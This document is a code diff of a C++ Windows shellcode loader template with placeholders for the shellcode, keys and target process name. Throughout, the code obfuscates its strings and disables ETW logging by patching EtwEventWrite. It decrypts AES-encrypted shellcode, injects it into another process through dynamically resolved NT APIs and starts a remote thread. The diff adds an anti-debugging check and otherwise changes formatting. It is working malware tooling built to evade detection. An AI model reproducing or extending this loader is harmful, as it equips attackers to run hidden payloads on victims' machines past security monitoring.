@@ -15,16 +15,17 @@
 #include <windows.h>
 #include <bcrypt.h>
 #include <tlhelp32.h>
+#include <winternl.h>
 
 #pragma comment(lib, "bcrypt.lib")
 
-// Runtime decrypted strings with helper macro
+ // Runtime decrypted strings with helper macro
 template <int N, int K>
 struct ObfuscatedString
 {
     char data[N];
 
-    constexpr ObfuscatedString(const char (&str)[N], const char (&key)[K]) : data{}
+    constexpr ObfuscatedString(const char(&str)[N], const char(&key)[K]) : data{}
     {
         for (int i = 0; i < N; i++)
         {
@@ -32,7 +33,7 @@ struct ObfuscatedString
         }
     }
 
-    void decrypt(char *output, char *key) const
+    void decrypt(char* output, char* key) const
     {
         for (int i = 0; i < N; i++)
         {
@@ -47,13 +48,19 @@ struct ObfuscatedString
     obf.decrypt(decrypted, key); \
     return decrypted; }()
 
+
+int CheckIfDebuggerPresent() {
+    PPEB pPEB = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
+    return pPEB->BeingDebugged ? 1 : 0;
+}
+
 // ============================================================
 // SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
 // ============================================================
 
-unsigned char encrypted_shellcode[] = {${SHELLCODE}};
-unsigned char aes_key[] = {${KEY}};
-unsigned char aes_iv[] = {${IV}};
+unsigned char encrypted_shellcode[] = { ${ SHELLCODE } };
+unsigned char aes_key[] = { ${ KEY } };
+unsigned char aes_iv[] = { ${ IV } };
 
 // ============================================================
 // SECTION 2: Stack Strings (no strings in .rdata)
@@ -66,9 +73,9 @@ unsigned char aes_iv[] = {${IV}};
 void PatchETW()
 {
     // const char *ntdll = BuildString_ntdll();
-    const char *ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
+    const char* ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
     // const char *etwFunc = BuildString_EtwEventWrite();
-    const char *etwFunc = OBFSTR("EtwEventWrite", "${XOR_KEY}");
+    const char* etwFunc = OBFSTR("EtwEventWrite", "${XOR_KEY}");
 
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
@@ -78,11 +85,11 @@ void PatchETW()
     if (!pETW)
         return;
 
-    unsigned char patch[] = {0x48, 0x33, 0xC0, 0xC3}; // xor rax,rax; ret
+    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax,rax; ret
     DWORD oldProtect;
     VirtualProtect((LPVOID)pETW, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
     for (int i = 0; i < sizeof(patch); i++)
-        ((unsigned char *)pETW)[i] = patch[i];
+        ((unsigned char*)pETW)[i] = patch[i];
     VirtualProtect((LPVOID)pETW, sizeof(patch), oldProtect, &oldProtect);
 }
 
@@ -90,10 +97,10 @@ void PatchETW()
 // SECTION 4: AES Decryption (BCrypt API)
 // ============================================================
 
-BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
-                unsigned char *key, SIZE_T key_len,
-                unsigned char *iv, SIZE_T iv_len,
-                unsigned char **pt, SIZE_T *pt_len)
+BOOL AESDecrypt(unsigned char* ct, SIZE_T ct_len,
+    unsigned char* key, SIZE_T key_len,
+    unsigned char* iv, SIZE_T iv_len,
+    unsigned char** pt, SIZE_T* pt_len)
 {
 
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -107,7 +114,7 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
         return FALSE;
 
     status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-                               (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+        (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!BCRYPT_SUCCESS(status))
     {
         BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -115,11 +122,11 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
     }
 
     BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
-                      (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
+        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
     pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
 
     status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj,
-                                        key, (ULONG)key_len, 0);
+        key, (ULONG)key_len, 0);
     if (!BCRYPT_SUCCESS(status))
     {
         HeapFree(GetProcessHeap(), 0, pbKeyObj);
@@ -128,16 +135,16 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
     }
 
     // Copy IV (BCryptDecrypt modifies it)
-    unsigned char *ivCopy = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, iv_len);
+    unsigned char* ivCopy = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, iv_len);
     for (SIZE_T i = 0; i < iv_len; i++)
         ivCopy[i] = iv[i];
 
     // Get output size
     DWORD cbPt = 0;
     BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL, ivCopy, (ULONG)iv_len,
-                  NULL, 0, &cbPt, BCRYPT_BLOCK_PADDING);
+        NULL, 0, &cbPt, BCRYPT_BLOCK_PADDING);
 
-    *pt = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, cbPt);
+    *pt = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, cbPt);
 
     // Reset IV copy
     for (SIZE_T i = 0; i < iv_len; i++)
@@ -145,7 +152,7 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
 
     // Decrypt
     status = BCryptDecrypt(hKey, ct, (ULONG)ct_len, NULL,
-                           ivCopy, (ULONG)iv_len, *pt, cbPt, &cbPt, BCRYPT_BLOCK_PADDING);
+        ivCopy, (ULONG)iv_len, *pt, cbPt, &cbPt, BCRYPT_BLOCK_PADDING);
 
     *pt_len = cbPt;
 
@@ -163,9 +170,9 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
 
 DWORD FindTargetProcess()
 {
-    const char *target = OBFSTR("${TARGET_PROCESS}", "${XOR_KEY}");
+    const char* target = OBFSTR("${TARGET_PROCESS}", "${XOR_KEY}");
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe = {sizeof(pe)};
+    PROCESSENTRY32 pe = { sizeof(pe) };
     if (Process32First(snap, &pe))
     {
         do
@@ -185,16 +192,16 @@ DWORD FindTargetProcess()
 // SECTION 6: Dynamic API Resolution
 // ============================================================
 
-typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(
-    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS(NTAPI *pNtWriteVirtualMemory)(
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
+    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
     HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(
-    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
+typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
+    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
     PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
     PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
-typedef NTSTATUS(NTAPI *pNtOpenProcess)(
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(
     PHANDLE, ACCESS_MASK, PVOID, PVOID);
 
 typedef struct
@@ -227,7 +234,7 @@ int main()
 
     // ---- Phase 2: Resolve APIs ----
     // const char *ntdll = BuildString_ntdll();
-    const char *ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
+    const char* ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
         return 1;
@@ -357,13 +364,13 @@ int main()
         return 1;
 
     // ---- Phase 3: Decrypt shellcode ----
-    unsigned char *decrypted = NULL;
+    unsigned char* decrypted = NULL;
     SIZE_T decrypted_len = 0;
 
     if (!AESDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode),
-                    aes_key, sizeof(aes_key),
-                    aes_iv, sizeof(aes_iv),
-                    &decrypted, &decrypted_len))
+        aes_key, sizeof(aes_key),
+        aes_iv, sizeof(aes_iv),
+        &decrypted, &decrypted_len))
     {
         return 1;
     }
@@ -378,8 +385,8 @@ int main()
     }
 
     HANDLE hProcess = NULL;
-    MY_OA oa = {sizeof(MY_OA), 0};
-    MY_CID cid = {(HANDLE)(ULONG_PTR)targetPID, 0};
+    MY_OA oa = { sizeof(MY_OA), 0 };
+    MY_CID cid = { (HANDLE)(ULONG_PTR)targetPID, 0 };
 
     NtOpen(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
     if (!hProcess)
@@ -396,7 +403,7 @@ int main()
     SIZE_T original_shellcode_size = sizeof(encrypted_shellcode);
     SIZE_T regionSize = (decrypted_len + 4096) & ~0xFFF; // Extra padding
     NtAlloc(hProcess, &remoteBase, 0, &regionSize,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!remoteBase)
     {
@@ -409,7 +416,7 @@ int main()
     // Write decrypted shellcode to remote process
     SIZE_T written = 0;
     NtWrite(hProcess, remoteBase, decrypted,
-            original_shellcode_size, &written);
+        original_shellcode_size, &written);
 
     // Immediately zero local decrypted copy
     SecureZeroMemory(decrypted, decrypted_len);
@@ -420,13 +427,13 @@ int main()
     SIZE_T protSize = original_shellcode_size;
     ULONG oldProt = 0;
     NtProtect(hProcess, &protBase, &protSize,
-              PAGE_EXECUTE_READ, &oldProt);
+        PAGE_EXECUTE_READ, &oldProt);
 
     // Create remote thread via NtCreateThreadEx
     HANDLE hThread = NULL;
     NtThread(&hThread, THREAD_ALL_ACCESS, NULL,
-             hProcess, remoteBase, NULL,
-             0, 0, 0, 0, NULL);
+        hProcess, remoteBase, NULL,
+        0, 0, 0, 0, NULL);
 
     // Wait briefly then exit (or wait for thread)
     if (hThread)
